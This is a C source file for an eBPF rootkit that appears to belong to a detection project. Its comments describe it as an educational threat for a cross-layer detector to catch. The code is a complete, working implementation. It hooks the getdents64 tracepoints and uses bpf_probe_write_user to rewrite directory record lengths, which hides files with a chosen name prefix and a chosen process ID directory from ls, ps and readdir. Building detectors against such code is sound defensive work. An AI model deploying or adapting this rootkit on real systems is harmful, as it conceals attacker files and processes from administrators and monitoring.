/* SPDX-License-Identifier: GPL-2.0 */
/*
 * rootkit.bpf.c - adversarial vector (Layer 0).
 *
 * A controlled, educational eBPF rootkit that tampers with the results of the
 * getdents64(2) system call in order to hide directory entries from userland.
 * It is the THREAT this project is built to detect; it exists only so the
 * cross-layer detector has something real to catch. See SAFETY.md.
 *
 * Mechanism (classic getdents hiding, e.g. the "bad-bpf" lineage):
 *   1. tp/syscalls/sys_enter_getdents64 stashes the userspace linux_dirent64
 *      buffer pointer for the calling thread.
 *   2. tp/syscalls/sys_exit_getdents64 walks the records the kernel just wrote
 *      into that buffer. When it finds a record whose name matches the hide
 *      policy, it extends the PREVIOUS record's d_reclen with bpf_probe_write_user
 *      so the target is swallowed and never seen by ls/ps/readdir.
 *
 * Limitations (intentional, documented):
 *   - The first record in a buffer cannot be merged "upward", so a target that
 *     lands first in a block is not hidden. Real targets (rootkit_*, a numeric
 *     PID dir) are never the first entry ("." sorts first), so this is benign
 *     for the demo and keeps the verifier happy.
 *   - bpf_probe_write_user taints the kernel (a dmesg warning is expected).
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>
#include "../common.h"

char LICENSE[] SEC("license") = "GPL";

#define MAX_DENTS 512          /* bound the record walk for the verifier */

/* d_* field offsets inside struct linux_dirent64 (kernel ABI, stable). */
#define DIRENT_RECLEN_OFF 16   /* unsigned short d_reclen                */
#define DIRENT_NAME_OFF   19   /* char d_name[]  (after d_type at 18)    */

/* per-thread save of the dirent buffer passed to getdents64 */
struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 8192);
	__type(key, __u64);        /* pid_tgid */
	__type(value, __u64);      /* userspace dirp */
} buffers SEC(".maps");

/* single-entry config map, written by the userspace loader */
struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, struct rk_config);
} rk_cfg SEC(".maps");

static __always_inline struct rk_config *get_cfg(void)
{
	__u32 k = 0;
	return bpf_map_lookup_elem(&rk_cfg, &k);
}

/* case-sensitive prefix test: does name[] start with cfg->prefix? */
static __always_inline int has_prefix(const char *name, const struct rk_config *cfg)
{
	if (cfg->prefix_len == 0 || cfg->prefix_len >= MAX_NAME_LEN)
		return 0;
#pragma unroll
	for (int i = 0; i < MAX_NAME_LEN; i++) {
		if (i >= cfg->prefix_len)
			return 1;             /* matched the whole prefix */
		if (name[i] != cfg->prefix[i])
			return 0;
	}
	return 1;
}

/* compare name[] against the decimal spelling of cfg->hide_pid */
static __always_inline int is_hidden_pid(const char *name, __u32 pid)
{
	char buf[16];
	int n = 0;
	__u32 v = pid;

	if (pid == 0)
		return 0;
	/* build decimal string (reversed) */
	char rev[16];
	int r = 0;
#pragma unroll
	for (int i = 0; i < 10; i++) {
		if (v == 0)
			break;
		rev[r++] = '0' + (v % 10);
		v /= 10;
	}
	if (r == 0)
		return 0;
#pragma unroll
	for (int i = 0; i < 16; i++) {
		if (i >= r)
			break;
		buf[n++] = rev[r - 1 - i];
	}
	/* exact-length match against name */
#pragma unroll
	for (int i = 0; i < 16; i++) {
		if (i >= n)
			return name[i] == '\0';   /* name must terminate here */
		if (name[i] != buf[i])
			return 0;
	}
	return 0;
}

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
	struct rk_config *cfg = get_cfg();
	__u64 id = bpf_get_current_pid_tgid();
	__u64 dirp = (__u64)ctx->args[1];   /* struct linux_dirent64 *dirp */

	if (!cfg || !cfg->enabled)
		return 0;
	bpf_map_update_elem(&buffers, &id, &dirp, BPF_ANY);
	return 0;
}

struct getdents_ctx {
    __u64 dirp;
    long total;
    long bpos;
    __u64 prev;
    struct rk_config *cfg;
};

static long process_one_dirent(__u32 index, void *ctx)
{
    struct getdents_ctx *c = ctx;
    __u64 cur;
    unsigned short reclen = 0;
    char name[MAX_NAME_LEN] = {};

    if (c->bpos >= c->total)
        return 1; // stop loop

    cur = c->dirp + c->bpos;

    if (bpf_probe_read_user(&reclen, sizeof(reclen),
                (void *)(cur + DIRENT_RECLEN_OFF)))
        return 1;
    if (reclen == 0)
        return 1;

    bpf_probe_read_user_str(name, sizeof(name),
                (void *)(cur + DIRENT_NAME_OFF));

    if (has_prefix(name, c->cfg) || is_hidden_pid(name, c->cfg->hide_pid)) {
        if (c->prev) {
            unsigned short plen = 0;
            bpf_probe_read_user(&plen, sizeof(plen),
                        (void *)(c->prev + DIRENT_RECLEN_OFF));
            plen += reclen;
            bpf_probe_write_user((void *)(c->prev + DIRENT_RECLEN_OFF),
                         &plen, sizeof(plen));
        }
        // keep prev unchanged so consecutive targets merge
    } else {
        c->prev = cur;
    }
    c->bpos += reclen;
    return 0; // continue
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    struct rk_config *cfg = get_cfg();
    __u64 id = bpf_get_current_pid_tgid();
    long total = ctx->ret;
    __u64 *pdirp;
    struct getdents_ctx c = {};

    if (!cfg || !cfg->enabled)
        goto done;
    pdirp = bpf_map_lookup_elem(&buffers, &id);
    if (!pdirp)
        return 0;
    c.dirp = *pdirp;
    c.total = total;
    c.prev = 0;
    c.cfg = cfg;

    if (total <= 0)
        goto done;

    bpf_loop(MAX_DENTS, process_one_dirent, &c, 0);

done:
    bpf_map_delete_elem(&buffers, &id);
    return 0;
}
